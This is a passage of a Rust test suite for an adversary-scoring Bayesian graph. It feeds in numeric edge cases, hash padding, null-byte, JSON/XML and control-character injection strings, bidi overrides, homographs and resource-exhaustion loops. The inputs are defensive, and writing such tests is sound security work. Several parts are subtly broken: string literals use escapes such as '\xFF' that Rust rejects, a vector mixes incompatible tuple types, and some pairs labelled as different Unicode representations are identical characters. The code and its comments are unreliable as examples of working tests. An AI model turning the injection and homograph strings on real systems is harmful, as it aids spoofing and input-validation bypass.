        // Test 1: Beta distribution edge cases and mathematical boundary conditions
        let bayesian_edge_cases = vec![
            // Extreme alpha/beta ratios that could cause numerical instability
            (0.999999999999999, 1, "near_certainty_alpha"),
            (0.000000000000001, 1, "near_zero_alpha"),
            (0.5, u64::MAX / 2, "massive_beta_weight"),
            (0.5, 1, "minimal_computation"),

            // Values that test precision boundaries of f64
            (1.0 - f64::EPSILON, 1, "just_below_one"),
            (f64::MIN_POSITIVE, 1, "smallest_positive"),
            (0.5 + f64::EPSILON/2.0, 1, "half_plus_epsilon"),
            (0.9999999999999998, u64::MAX / 1000000, "near_one_massive_weight"),

            // Sequences that could cause cumulative rounding errors
            (1.0/3.0, 3, "repeating_decimal_weight"),
            (std::f64::consts::PI / 4.0, 7, "irrational_likelihood"),
            (std::f64::consts::E / 3.0, 11, "transcendental_likelihood"),
        ];

        for (likelihood, weight, test_name) in bayesian_edge_cases {
            for iteration in 0..1000 {
                let observation = AdversaryObservation::new(
                    format!("bayesian_edge_{}", test_name),
                    likelihood,
                    weight,
                    format!("evidence_{}_{}", test_name, iteration),
                    format!("trace_{}_{}", test_name, iteration),
                ).unwrap();

                if let Ok(posterior) = graph.ingest(&observation) {
                    // Verify mathematical properties remain valid
                    assert!(posterior.posterior.is_finite(),
                        "Posterior should remain finite for {} at iteration {}: {}", test_name, iteration, posterior.posterior);
                    assert!((0.0..=1.0).contains(&posterior.posterior),
                        "Posterior should stay in valid range for {} at iteration {}: {}", test_name, iteration, posterior.posterior);

                    // Verify beta distribution parameters don't overflow
                    assert!(posterior.alpha != u64::MAX || posterior.beta != u64::MAX,
                        "Should use saturating arithmetic for {} at iteration {}", test_name, iteration);

                    // Verify evidence accumulation is consistent
                    assert!(posterior.evidence_count == (iteration + 1) as u64,
                        "Evidence count should match iterations for {}: {} != {}", test_name, posterior.evidence_count, iteration + 1);
                }
            }
        }

        // Test 2: Beta function approximation attacks and convergence manipulation
        let convergence_attack_sequences = vec![
            // Alternating extreme values to test convergence stability
            vec![(0.999, 1), (0.001, 1), (0.999, 1), (0.001, 1)],
            // Exponentially decreasing likelihood with increasing weight
            (0..20).map(|i| (0.5_f64.powi(i), (2_u64).pow(i as u32).min(1000))).collect(),
            // Sine wave likelihood pattern to test periodic convergence
            (0..100).map(|i| ((((i as f64) * 0.1).sin().abs()), (i % 10) + 1)).collect(),
            // Fibonacci-weighted observations
            vec![(0.618, 1), (0.618, 1), (0.618, 2), (0.618, 3), (0.618, 5), (0.618, 8), (0.618, 13)],
        ];

        for (seq_idx, sequence) in convergence_attack_sequences.iter().enumerate() {
            let principal_id = format!("convergence_attack_{}", seq_idx);

            for (obs_idx, (likelihood, weight)) in sequence.iter().enumerate() {
                let observation = AdversaryObservation::new(
                    principal_id.clone(),
                    *likelihood,
                    *weight,
                    format!("conv_evidence_{}_{}", seq_idx, obs_idx),
                    format!("conv_trace_{}_{}", seq_idx, obs_idx),
                ).unwrap();

                if let Ok(posterior) = graph.ingest(&observation) {
                    // Verify convergence properties
                    assert!(posterior.posterior.is_finite(),
                        "Convergence sequence {} observation {} should produce finite posterior", seq_idx, obs_idx);

                    // Check that posterior changes are reasonable (no wild swings)
                    if obs_idx > 0 {
                        let posteriors = graph.posteriors();
                        let current_posterior = posteriors.iter().find(|p| p.principal_id == principal_id).unwrap();

                        // With enough evidence, posterior should stabilize (not change drastically)
                        if obs_idx > 10 {
                            assert!(current_posterior.posterior >= 0.01 && current_posterior.posterior <= 0.99,
                                "Large evidence sets should avoid extreme posteriors for sequence {}: {}", seq_idx, current_posterior.posterior);
                        }
                    }
                }
            }
        }

        // Test 3: Precision loss and numerical stability under extreme computation
        let precision_stress_principal = "precision_stress_test";

        // Add many tiny observations to test cumulative precision loss
        for i in 0..50000 {
            let tiny_likelihood = 1e-12; // Very small but non-zero
            let observation = AdversaryObservation::new(
                precision_stress_principal,
                tiny_likelihood,
                1,
                format!("tiny_evidence_{}", i),
                format!("tiny_trace_{}", i),
            ).unwrap();

            if let Ok(posterior) = graph.ingest(&observation) {
                if i % 10000 == 0 {
                    assert!(posterior.posterior.is_finite(),
                        "Precision should not degrade to non-finite at iteration {}", i);
                    assert!(posterior.posterior < 1e-6,
                        "Many tiny likelihoods should keep posterior very low at iteration {}: {}", i, posterior.posterior);
                }
            }
        }

        // Add a few high-likelihood observations to test rapid convergence
        for i in 0..10 {
            let high_likelihood = 0.9999;
            let observation = AdversaryObservation::new(
                precision_stress_principal,
                high_likelihood,
                1000,
                format!("high_evidence_{}", i),
                format!("high_trace_{}", i),
            ).unwrap();

            if let Ok(posterior) = graph.ingest(&observation) {
                assert!(posterior.posterior.is_finite(),
                    "High likelihood observations should maintain finite posterior at iteration {}", i);
                if i > 5 {
                    assert!(posterior.posterior > 0.9,
                        "Strong evidence should rapidly increase posterior at iteration {}: {}", i, posterior.posterior);
                }
            }
        }
    }

    #[test]
    fn negative_evidence_chaining_cryptographic_hash_manipulation_advanced_attacks() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Advanced hash collision and preimage attacks
        let cryptographic_attack_vectors = vec![
            // Length extension attack attempts
            ("evidence", "trace", "evidence\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08", "trace"),
            // Hash function state manipulation
            ("a".repeat(55), "trace1", "a".repeat(56), "trace1"), // MD5 block boundary
            ("b".repeat(63), "trace2", "b".repeat(64), "trace2"), // SHA-256 block boundary

            // Unicode normalization attacks on evidence content
            ("café", "trace", "cafe\u{0301}", "trace"), // NFC vs NFD
            ("²", "trace", "\u{00B2}", "trace"), // Different Unicode representations
            ("🚀", "trace", "\u{1F680}", "trace"), // Emoji vs codepoint

            // Null byte and control character injection in evidence
            ("evidence\x00hidden", "trace", "evidence", "trace\x00hidden"),
            ("evi\rdence", "tr\nace", "evi\ndence", "tr\race"),

            // JSON/XML structure injection in evidence content
            ("{\"malicious\":\"evidence\"}", "trace", "evidence", "{\"malicious\":\"trace\"}"),
            ("<evidence>attack</evidence>", "trace", "evidence", "<trace>attack</trace>"),

            // Binary data and encoding edge cases
            ("\xFF\xFE\xFD\xFC", "trace", "evidence", "\xFF\xFE\xFD\xFC"),
            ("evidence", "\xC0\x80", "evidence", "\xE0\x80\x80"), // Overlong UTF-8
        ];

        let mut seen_hashes = std::collections::HashSet::new();

        for (evidence1, trace1, evidence2, trace2) in cryptographic_attack_vectors {
            // Test first evidence/trace combination
            let obs1 = AdversaryObservation::new(
                "hash_attack_test",
                0.3,
                100,
                evidence1,
                trace1,
            ).unwrap();

            // Test second evidence/trace combination
            let obs2 = AdversaryObservation::new(
                "hash_attack_test",
                0.7,
                100,
                evidence2,
                trace2,
            ).unwrap();

            let result1 = graph.ingest(&obs1).unwrap();
            let result2 = graph.ingest(&obs2).unwrap();

            // Verify hash uniqueness
            assert!(seen_hashes.insert(result1.evidence_hash.clone()),
                "Hash collision detected for evidence1: '{}' + '{}'", evidence1.escape_debug(), trace1.escape_debug());
            assert!(seen_hashes.insert(result2.evidence_hash.clone()),
                "Hash collision detected for evidence2: '{}' + '{}'", evidence2.escape_debug(), trace2.escape_debug());

            // Verify different evidence produces different hashes
            if evidence1 != evidence2 || trace1 != trace2 {
                assert_ne!(result1.evidence_hash, result2.evidence_hash,
                    "Different evidence should produce different hashes: ('{}' + '{}') vs ('{}' + '{}')",
                    evidence1.escape_debug(), trace1.escape_debug(), evidence2.escape_debug(), trace2.escape_debug());
            }

            // Verify hash format and characteristics
            assert!(!result2.evidence_hash.is_empty(), "Hash should not be empty");
            assert!(result2.evidence_hash.len() >= 32, "Hash should be reasonable length: {}", result2.evidence_hash.len());
            assert!(result2.evidence_hash.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
                "Hash should contain safe characters: {}", result2.evidence_hash);
        }

        // Test 2: Hash chain ordering and dependency attacks
        let chain_manipulation_sequences = vec![
            // Forward then reverse evidence chain
            vec![("evidence_a", "trace_1"), ("evidence_b", "trace_2"), ("evidence_c", "trace_3")],
            vec![("evidence_c", "trace_3"), ("evidence_b", "trace_2"), ("evidence_a", "trace_1")],

            // Interleaved evidence chains
            vec![("evidence_1", "trace_a"), ("evidence_2", "trace_b"), ("evidence_1", "trace_c"), ("evidence_2", "trace_d")],

            // Duplicate evidence with different traces
            vec![("same_evidence", "trace_1"), ("same_evidence", "trace_2"), ("same_evidence", "trace_3")],

            // Evidence with hash-confusing content
            vec![("prefix_suffix", "trace"), ("prefix", "_suffixetrace"), ("prefi", "x_suffixetrace")],
        ];

        for (chain_idx, sequence) in chain_manipulation_sequences.iter().enumerate() {
            let principal_id = format!("chain_test_{}", chain_idx);
            let mut chain_hashes = Vec::new();

            for (evidence, trace) in sequence {
                let observation = AdversaryObservation::new(
                    principal_id.clone(),
                    0.5,
                    50,
                    evidence,
                    trace,
                ).unwrap();

                if let Ok(posterior) = graph.ingest(&observation) {
                    chain_hashes.push(posterior.evidence_hash.clone());
                }
            }

            // Verify chain produces consistent hash progression
            if chain_hashes.len() > 1 {
                // Each step should produce a different hash (evidence chaining)
                for i in 1..chain_hashes.len() {
                    assert_ne!(chain_hashes[i-1], chain_hashes[i],
                        "Chain sequence {} step {} should produce different hash", chain_idx, i);
                }
            }
        }

        // Test 3: Large-scale hash distribution and clustering attacks
        let mut hash_prefixes = std::collections::HashMap::new();
        let distribution_test_count = 10000;

        for i in 0..distribution_test_count {
            let evidence = format!("distribution_evidence_{}", i);
            let trace = format!("distribution_trace_{}", i);

            let observation = AdversaryObservation::new(
                format!("distribution_principal_{}", i % 100), // Cluster principals
                (i as f64) / (distribution_test_count as f64),
                (i % 1000) + 1,
                &evidence,
                &trace,
            ).unwrap();

            if let Ok(posterior) = graph.ingest(&observation) {
                // Check hash distribution properties
                let hash_prefix = if posterior.evidence_hash.len() >= 4 {
                    &posterior.evidence_hash[..4]
                } else {
                    &posterior.evidence_hash
                };

                *hash_prefixes.entry(hash_prefix.to_string()).or_insert(0) += 1;
            }
        }

        // Verify reasonable hash distribution (no excessive clustering)
        let max_prefix_count = hash_prefixes.values().max().unwrap_or(&0);
        let min_prefix_count = hash_prefixes.values().min().unwrap_or(&0);
        let prefix_count = hash_prefixes.len();

        assert!(prefix_count >= 200, "Should have diverse hash prefixes: {}", prefix_count);
        assert!(*max_prefix_count <= distribution_test_count / 50,
            "Hash clustering should be limited: max {} in {}", max_prefix_count, distribution_test_count);

        println!("Hash distribution test completed: {} prefixes, max cluster {}, min cluster {}",
            prefix_count, max_prefix_count, min_prefix_count);
    }

    #[test]
    fn negative_adversary_modeling_policy_validation_bypass_and_manipulation_attacks() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Adversary behavior modeling edge cases and policy bypass attempts
        let adversary_modeling_attack_scenarios = vec![
            // Gradual trust building then rapid exploitation
            ("gradual_exploit", vec![
                (0.01, 10), (0.02, 10), (0.05, 10), (0.1, 10), (0.2, 10), // Build trust
                (0.95, 1000), (0.99, 1000), (0.999, 1000) // Exploit trust
            ]),

            // Oscillating behavior to confuse modeling
            ("oscillating", vec![
                (0.9, 100), (0.1, 100), (0.9, 100), (0.1, 100), (0.9, 100), (0.1, 100)
            ]),

            // Threshold probing (finding policy boundaries)
            ("threshold_probe", vec![
                (0.49, 100), (0.50, 100), (0.51, 100), (0.499, 100), (0.501, 100)
            ]),

            // Volume-based manipulation (small changes with massive weight)
            ("volume_manipulation", vec![
                (0.45, 1), (0.455, 10000), (0.46, 1), (0.465, 10000)
            ]),

            // Time-diluted attacks (consistent low-level malicious behavior)
            ("time_dilution", (0..1000).map(|_| (0.55, 1)).collect()),

            // Mixed signal injection (alternating benign/malicious at different rates)
            ("mixed_signal", vec![
                (0.01, 100), (0.01, 100), (0.99, 1), (0.01, 100), (0.01, 100), (0.99, 1)
            ]),
        ];

        for (scenario_name, sequence) in adversary_modeling_attack_scenarios {
            let principal_id = format!("adversary_model_{}", scenario_name);
            let mut posterior_progression = Vec::new();

            for (step_idx, (likelihood, weight)) in sequence.iter().enumerate() {
                let observation = AdversaryObservation::new(
                    principal_id.clone(),
                    *likelihood,
                    *weight,
                    format!("{}_evidence_{}", scenario_name, step_idx),
                    format!("{}_trace_{}", scenario_name, step_idx),
                ).unwrap();

                if let Ok(posterior) = graph.ingest(&observation) {
                    posterior_progression.push(posterior.posterior);

                    // Verify modeling resists manipulation
                    assert!(posterior.posterior.is_finite(),
                        "Scenario {} step {} should maintain finite posterior", scenario_name, step_idx);
                    assert!((0.0..=1.0).contains(&posterior.posterior),
                        "Scenario {} step {} should keep posterior in valid range: {}", scenario_name, step_idx, posterior.posterior);
                }
            }

            // Analyze posterior progression for resistance to manipulation
            if posterior_progression.len() > 10 {
                let initial_avg = posterior_progression[..5].iter().sum::<f64>() / 5.0;
                let final_avg = posterior_progression[posterior_progression.len()-5..].iter().sum::<f64>() / 5.0;

                match scenario_name {
                    "gradual_exploit" => {
                        // Should show gradual increase but not wild swings
                        assert!(final_avg > initial_avg,
                            "Gradual exploit should increase posterior: {} -> {}", initial_avg, final_avg);
                        assert!(final_avg < 0.98,
                            "Should resist complete trust exploitation: {}", final_avg);
                    },
                    "oscillating" => {
                        // Should converge to middle ground, not oscillate wildly
                        let variance = posterior_progression.iter()
                            .map(|p| (p - 0.5).powi(2))
                            .sum::<f64>() / posterior_progression.len() as f64;
                        assert!(variance < 0.1,
                            "Oscillating behavior should not cause high variance: {}", variance);
                    },
                    "time_dilution" => {
                        // Should slowly drift toward true likelihood
                        assert!(final_avg > 0.5 && final_avg < 0.65,
                            "Time dilution should converge near true likelihood: {}", final_avg);
                    },
                    _ => {
                        // General resistance checks for other scenarios
                        assert!(final_avg >= 0.001 && final_avg <= 0.999,
                            "Scenario {} should avoid extreme posteriors: {}", scenario_name, final_avg);
                    }
                }
            }
        }

        // Test 2: Policy threshold manipulation and boundary condition attacks
        let policy_boundary_tests = vec![
            // Boundary values around common policy thresholds
            (0.0, "zero_threshold"),
            (0.001, "near_zero"),
            (0.1, "low_threshold"),
            (0.25, "quarter_threshold"),
            (0.5, "half_threshold"),
            (0.75, "three_quarter_threshold"),
            (0.9, "high_threshold"),
            (0.99, "very_high_threshold"),
            (0.999, "near_one"),
            (1.0, "one_threshold"),
        ];

        for (threshold_likelihood, test_name) in policy_boundary_tests {
            let principal_id = format!("policy_boundary_{}", test_name);

            // Test approach to boundary from below
            for i in 1..=100 {
                let below_threshold = threshold_likelihood - (0.001 * (101 - i) as f64 / 100.0);
                let bounded_likelihood = below_threshold.max(0.0).min(1.0);

                if bounded_likelihood >= 0.0 && bounded_likelihood <= 1.0 {
                    let observation = AdversaryObservation::new(
                        principal_id.clone(),
                        bounded_likelihood,
                        100,
                        format!("below_evidence_{}_{}", test_name, i),
                        format!("below_trace_{}_{}", test_name, i),
                    ).unwrap();

                    if let Ok(posterior) = graph.ingest(&observation) {
                        assert!(posterior.posterior.is_finite(),
                            "Below-boundary test {} iteration {} should be finite", test_name, i);
                    }
                }
            }

            // Test approach to boundary from above
            for i in 1..=100 {
                let above_threshold = threshold_likelihood + (0.001 * (101 - i) as f64 / 100.0);
                let bounded_likelihood = above_threshold.max(0.0).min(1.0);

                if bounded_likelihood >= 0.0 && bounded_likelihood <= 1.0 {
                    let observation = AdversaryObservation::new(
                        principal_id.clone(),
                        bounded_likelihood,
                        100,
                        format!("above_evidence_{}_{}", test_name, i),
                        format!("above_trace_{}_{}", test_name, i),
                    ).unwrap();

                    if let Ok(posterior) = graph.ingest(&observation) {
                        assert!(posterior.posterior.is_finite(),
                            "Above-boundary test {} iteration {} should be finite", test_name, i);
                    }
                }
            }
        }

        // Test 3: Multi-principal coordinated attack simulation
        let coordinated_attack_principals = (0..20).map(|i| format!("coordinated_principal_{}", i)).collect::<Vec<_>>();

        // Phase 1: Establish benign baseline for all principals
        for principal in &coordinated_attack_principals {
            for i in 0..50 {
                let observation = AdversaryObservation::new(
                    principal.clone(),
                    0.1, // Low malicious likelihood
                    10,
                    format!("benign_evidence_{}_{}", principal, i),
                    format!("benign_trace_{}_{}", principal, i),
                ).unwrap();
                let _ = graph.ingest(&observation);
            }
        }

        // Phase 2: Coordinated escalation (simulating coordinated attack)
        for escalation_step in 0..10 {
            let escalated_likelihood = 0.1 + (escalation_step as f64 * 0.08); // Gradually increase to 0.82

            for principal in &coordinated_attack_principals {
                let observation = AdversaryObservation::new(
                    principal.clone(),
                    escalated_likelihood,
                    100, // Higher weight for attack phase
                    format!("coordinated_evidence_{}_{}", principal, escalation_step),
                    format!("coordinated_trace_{}_{}", principal, escalation_step),
                ).unwrap();
                let _ = graph.ingest(&observation);
            }
        }

        // Verify system maintains stability under coordinated attack
        let final_posteriors = graph.posteriors();
        let coordinated_posteriors: Vec<_> = final_posteriors.iter()
            .filter(|p| p.principal_id.starts_with("coordinated_principal_"))
            .collect();

        assert_eq!(coordinated_posteriors.len(), 20, "Should track all coordinated principals");

        for posterior in &coordinated_posteriors {
            assert!(posterior.posterior.is_finite(),
                "Coordinated attack should not break posterior computation for {}", posterior.principal_id);
            assert!(posterior.posterior >= 0.3 && posterior.posterior <= 0.9,
                "Coordinated attack should produce reasonable posteriors for {}: {}", posterior.principal_id, posterior.posterior);
            assert_eq!(posterior.evidence_count, 60, "Should accumulate all evidence for {}", posterior.principal_id);
        }

        // Verify the graph didn't become unstable
        assert!(final_posteriors.len() <= 200, "Graph should not have excessive principals: {}", final_posteriors.len());
    }

    #[test]
    fn negative_resource_exhaustion_memory_consumption_pattern_and_denial_of_service_attacks() {
        // Test 1: Memory exhaustion through large graph construction
        let mut memory_stress_graph = AdversaryGraph::new();

        // Large number of unique principals (memory consumption test)
        let principal_count = 10000;
        let observations_per_principal = 100;

        for principal_id in 0..principal_count {
            for obs_id in 0..observations_per_principal {
                let observation = AdversaryObservation::new(
                    format!("memory_principal_{}", principal_id),
                    ((obs_id as f64) / (observations_per_principal as f64)) * 0.8 + 0.1, // 0.1 to 0.9
                    (obs_id % 100) + 1,
                    format!("memory_evidence_{}_{}", principal_id, obs_id),
                    format!("memory_trace_{}_{}", principal_id, obs_id),
                ).unwrap();

                if let Ok(posterior) = memory_stress_graph.ingest(&observation) {
                    // Periodic validation that system remains stable
                    if principal_id % 1000 == 0 && obs_id % 50 == 0 {
                        assert!(posterior.posterior.is_finite(),
                            "Memory stress should not corrupt posteriors at principal {} obs {}", principal_id, obs_id);
                        assert!((0.0..=1.0).contains(&posterior.posterior),
                            "Memory stress should not break posterior bounds at principal {} obs {}", principal_id, obs_id);
                    }
                }
            }

            // Periodic memory usage check
            if principal_id % 2000 == 0 {
                let current_posteriors = memory_stress_graph.posteriors();
                assert_eq!(current_posteriors.len(), (principal_id + 1) as usize,
                    "Should track exactly the right number of principals: {} != {}", current_posteriors.len(), principal_id + 1);

                // Verify no memory corruption
                for posterior in &current_posteriors {
                    assert!(!posterior.principal_id.is_empty(),
                        "Principal ID should not be corrupted");
                    assert!(posterior.evidence_count <= observations_per_principal as u64,
                        "Evidence count should be reasonable: {}", posterior.evidence_count);
                }
            }
        }

        // Test 2: Snapshot generation under memory pressure
        let large_snapshot = memory_stress_graph.snapshot("2026-04-17T15:00:00Z");
        assert_eq!(large_snapshot.posteriors.len(), principal_count as usize,
            "Large snapshot should contain all principals");

        // Test serialization of large snapshot (memory pressure test)
        let serialization_result = serde_json::to_string(&large_snapshot);
        match serialization_result {
            Ok(json_string) => {
                assert!(json_string.len() > 1000000, "Large snapshot should produce substantial JSON");

                // Test partial deserialization doesn't crash
                let truncated_json = &json_string[..100000.min(json_string.len())];
                let partial_parse_result: Result<serde_json::Value, _> = serde_json::from_str(truncated_json);
                // Partial parse may fail, but should not crash
            },
            Err(_) => {
                // Large serialization may fail due to memory limits - this is acceptable
            }
        }

        // Test 3: Computational complexity attack (algorithmic complexity)
        let mut complexity_graph = AdversaryGraph::new();

        // Create principals with similar names to stress hash table performance
        let similar_principal_patterns = vec![
            "principal", "principal_", "principal__", "principal_1", "principal_a",
            "_principal", "__principal", "1_principal", "a_principal", "principal1",
        ];

        for base_pattern in &similar_principal_patterns {
            for suffix_id in 0..1000 {
                let principal_id = format!("{}_{}", base_pattern, suffix_id);

                // Add observations with computationally expensive likelihood patterns
                for computation_step in 0..100 {
                    // Use computationally expensive likelihood calculation
                    let complex_likelihood = ((computation_step as f64).sin().abs() +
                                            (computation_step as f64 / 3.0).cos().abs()) / 2.0;

                    let observation = AdversaryObservation::new(
                        principal_id.clone(),
                        complex_likelihood,
                        computation_step + 1,
                        format!("complexity_evidence_{}_{}_{}", base_pattern, suffix_id, computation_step),
                        format!("complexity_trace_{}_{}_{}", base_pattern, suffix_id, computation_step),
                    ).unwrap();

                    if let Ok(posterior) = complexity_graph.ingest(&observation) {
                        // Verify computation remains stable despite complexity
                        assert!(posterior.posterior.is_finite(),
                            "Complex computation should remain finite for {} step {}", principal_id, computation_step);
                    }
                }
            }
        }

        // Test 4: Rapid observation ingestion (throughput stress test)
        let mut throughput_graph = AdversaryGraph::new();
        let rapid_fire_count = 100000;

        let start_time = std::time::Instant::now();

        for rapid_id in 0..rapid_fire_count {
            let observation = AdversaryObservation::new(
                format!("rapid_principal_{}", rapid_id % 100), // Cluster for stress
                ((rapid_id % 1000) as f64) / 1000.0,
                1,
                format!("rapid_evidence_{}", rapid_id),
                format!("rapid_trace_{}", rapid_id),
            ).unwrap();

            if let Ok(posterior) = throughput_graph.ingest(&observation) {
                // Spot check for stability
                if rapid_id % 10000 == 0 {
                    assert!(posterior.posterior.is_finite(),
                        "Rapid ingestion should maintain finite posteriors at iteration {}", rapid_id);
                    assert!(posterior.evidence_count > 0,
                        "Rapid ingestion should maintain evidence count at iteration {}", rapid_id);
                }
            }
        }

        let ingestion_duration = start_time.elapsed();
        let throughput = rapid_fire_count as f64 / ingestion_duration.as_secs_f64();

        // Verify reasonable performance (should process at least 1000 observations/second)
        assert!(throughput > 1000.0, "Throughput should be reasonable: {} obs/sec", throughput);

        // Verify final state integrity after rapid ingestion
        let final_posteriors = throughput_graph.posteriors();
        assert_eq!(final_posteriors.len(), 100, "Should have exactly 100 principals after rapid ingestion");

        for posterior in &final_posteriors {
            assert!(posterior.posterior.is_finite(),
                "All final posteriors should be finite: {}", posterior.posterior);
            assert!(posterior.evidence_count == 1000,
                "Evidence count should match rapid fire pattern: {}", posterior.evidence_count);
        }

        println!("Resource exhaustion test completed: {} principals, {} observations, {:.2} obs/sec throughput",
            final_posteriors.len(), rapid_fire_count, throughput);
    }

    #[test]
    fn negative_advanced_unicode_encoding_normalization_bypass_and_homograph_attacks() {
        let mut graph = AdversaryGraph::new();

        // Test 1: Advanced Unicode normalization attacks and encoding bypass
        let unicode_normalization_attacks = vec![
            // NFC vs NFD normalization attacks
            ("café", "cafe\u{0301}", "nfc_vs_nfd"),
            ("naïve", "nai\u{0308}ve", "nfc_vs_nfd_diaeresis"),

            // Unicode combining character attacks
            ("base", "base\u{0300}\u{0301}\u{0302}", "combining_stacking"),
            ("test", "te\u{0300}st", "combining_middle"),

            // Different Unicode representations of same glyph
            ("Ω", "\u{2126}", "ohm_vs_omega"), // Ohm symbol vs Greek capital omega
            ("K", "\u{212A}", "kelvin_vs_k"), // Kelvin symbol vs Latin K
            ("Å", "A\u{030A}", "angstrom_vs_a_ring"),

            // Width and spacing character attacks
            ("test", "test\u{3000}", "ideographic_space"),
            ("data", "data\u{2000}", "en_quad_space"),
            ("info", "info\u{200B}", "zero_width_space"),

            // BiDi (bidirectional text) override attacks
            ("admin", "\u{202E}nimda\u{202D}", "bidi_override"),
            ("user", "us\u{202E}re\u{202D}r", "bidi_middle"),

            // Invisible and non-printing character attacks
            ("hidden", "hid\u{FEFF}den", "zero_width_no_break"),
            ("secret", "sec\u{200C}ret", "zero_width_non_joiner"),
            ("stealth", "ste\u{200D}alth", "zero_width_joiner"),

            // Homograph attacks (different scripts, same appearance)
            ("admin", "аdmin", "cyrillic_a"), // Cyrillic а instead of Latin a
            ("test", "tеst", "cyrillic_e"), // Cyrillic е instead of Latin e
            ("user", "usеr", "cyrillic_e_user"), // Cyrillic е in user

            // Mixed script attacks
            ("login", "lοgin", "greek_omicron"), // Greek omicron instead of Latin o
            ("access", "ассess", "mixed_cyrillic"), // Cyrillic ас instead of Latin ac

            // Confusing Unicode blocks
            ("data", "𝖉𝖆𝖙𝖆", "mathematical_bold_fraktur"), // Mathematical bold fraktur
            ("info", "𝐢𝐧𝐟𝐨", "mathematical_bold"), // Mathematical bold
            ("test", "𝓽𝓮𝓼𝓽", "mathematical_script"), // Mathematical script
        ];

        for (normal_form, attack_form, attack_name) in unicode_normalization_attacks {
            // Test normal form
            let normal_obs = AdversaryObservation::new(
                format!("unicode_normal_{}", attack_name),
                0.3,
                100,
                normal_form,
                format!("trace_normal_{}", attack_name),
            ).unwrap();

            // Test attack form
            let attack_obs = AdversaryObservation::new(
                format!("unicode_attack_{}", attack_name),
                0.7,
                100,
                attack_form,
                format!("trace_attack_{}", attack_name),
            ).unwrap();

            let normal_result = graph.ingest(&normal_obs).unwrap();
            let attack_result = graph.ingest(&attack_obs).unwrap();

            // Verify both forms are handled without corruption
            assert!(normal_result.posterior.is_finite(),
                "Normal Unicode form should be handled for {}: {}", attack_name, normal_form.escape_debug());
            assert!(attack_result.posterior.is_finite(),
                "Attack Unicode form should be handled for {}: {}", attack_name, attack_form.escape_debug());

            // Verify principal IDs are preserved exactly
            assert_eq!(normal_result.principal_id, format!("unicode_normal_{}", attack_name),
                "Normal form principal ID should be preserved for {}", attack_name);
            assert_eq!(attack_result.principal_id, format!("unicode_attack_{}", attack_name),
                "Attack form principal ID should be preserved for {}", attack_name);

            // Verify evidence hashes differ for different forms
            if normal_form != attack_form {
                assert_ne!(normal_result.evidence_hash, attack_result.evidence_hash,
                    "Different Unicode forms should produce different evidence hashes for {}: '{}' vs '{}'",
                    attack_name, normal_form.escape_debug(), attack_form.escape_debug());
            }
        }

        // Test 2: Overlong encoding and malformed UTF-8 attacks
        let encoding_bypass_attacks = vec![
            // Overlong UTF-8 sequences
            "normal_a", // vs \xC1\x81 (overlong encoding of 'A')
            "normal_slash", // vs \xC0\xAF (overlong encoding of '/')

            // Surrogate pair attacks in UTF-16
            "surrogate_test",

            // Invalid UTF-8 sequences
            "replacement_char",
        ];

        for (idx, test_case) in encoding_bypass_attacks.iter().enumerate() {
            // Create observations with potentially problematic content
            let observation = AdversaryObservation::new(
                format!("encoding_test_{}", idx),
                0.5,
                50,
                test_case,
                format!("encoding_trace_{}", idx),
            ).unwrap();

            let result = graph.ingest(&observation);
            match result {
                Ok(posterior) => {
                    assert!(posterior.posterior.is_finite(),
                        "Encoding test {} should produce finite posterior", idx);
                    assert!(!posterior.evidence_hash.is_empty(),
                        "Encoding test {} should produce valid evidence hash", idx);
                },
                Err(error) => {
                    // Some encoding attacks may be rejected - ensure error is meaningful
                    assert!(!error.to_string().is_empty(),
                        "Encoding error should be meaningful for test {}: {:?}", idx, error);
                }
            }
        }

        // Test 3: Unicode injection in trace IDs and evidence references
        let injection_vectors = vec![
            // Control character injection
            ("evidence\x00injection", "trace\r\ninjection"),
            ("evidence\x1Bmanipulation", "trace\x1Battack"),

            // Unicode category manipulation
            ("evidence\u{061C}rtl", "trace\u{061C}attack"), // Arabic letter mark
            ("evidence\u{2066}isolate", "trace\u{2069}pop"), // Directional isolate

            // Private use area characters
            ("evidence\u{E000}private", "trace\u{F8FF}private"),
            ("evidence\u{10FFFF}plane16", "trace\u{EFFFF}plane15"),

            // Noncharacters
            ("evidence\u{FFFE}nonchar", "trace\u{FFFF}nonchar"),
            ("evidence\u{FDD0}nonchar", "trace\u{FDEF}nonchar"),
        ];

        for (evidence_content, trace_content) in injection_vectors {
            let observation = AdversaryObservation::new(
                "unicode_injection_test",
                0.4,
                75,
                evidence_content,
                trace_content,
            ).unwrap();

            if let Ok(posterior) = graph.ingest(&observation) {
                // Verify content is preserved exactly (no normalization corruption)
                assert_eq!(posterior.last_trace_id, trace_content,
                    "Trace ID should be preserved exactly: '{}'", trace_content.escape_debug());

                // Verify hash generation works despite Unicode content
                assert!(!posterior.evidence_hash.is_empty(),
                    "Evidence hash should be generated despite Unicode injection");
                assert!(posterior.evidence_hash.len() >= 16,
                    "Evidence hash should be reasonable length despite injection: {}", posterior.evidence_hash.len());
            }
        }

        // Test 4: Large-scale Unicode homograph collision detection
        let homograph_sets = vec![
            // Latin vs Cyrillic confusables
            vec!["a", "а"], // Latin a vs Cyrillic а
            vec!["e", "е"], // Latin e vs Cyrillic е
            vec!["o", "о"], // Latin o vs Cyrillic о
            vec!["p", "р"], // Latin p vs Cyrillic р
            vec!["c", "с"], // Latin c vs Cyrillic с
            vec!["x", "х"], // Latin x vs Cyrillic х

            // Greek vs Latin confusables
            vec!["A", "Α"], // Latin A vs Greek Alpha
            vec!["B", "Β"], // Latin B vs Greek Beta
            vec!["O", "Ο"], // Latin O vs Greek Omicron
            vec!["P", "Ρ"], // Latin P vs Greek Rho

            // Mathematical vs normal characters
            vec!["A", "𝐀", "𝐴", "𝖠"], // Various mathematical A's
            vec!["a", "𝐚", "𝑎", "𝖆"], // Various mathematical a's
        ];

        let mut homograph_hashes = std::collections::HashMap::new();

        for (set_idx, homograph_set) in homograph_sets.iter().enumerate() {
            for (variant_idx, variant) in homograph_set.iter().enumerate() {
                let observation = AdversaryObservation::new(
                    format!("homograph_principal_{}", variant),
                    0.6,
                    100,
                    format!("homograph_evidence_{}_{}", set_idx, variant_idx),
                    format!("homograph_trace_{}", variant),
                ).unwrap();

                if let Ok(posterior) = graph.ingest(&observation) {
                    // Track hash for collision detection
                    let hash_key = (posterior.principal_id.clone(), posterior.evidence_hash.clone());
                    homograph_hashes.insert(hash_key, variant.to_string());

                    // Verify distinct handling of visually similar characters
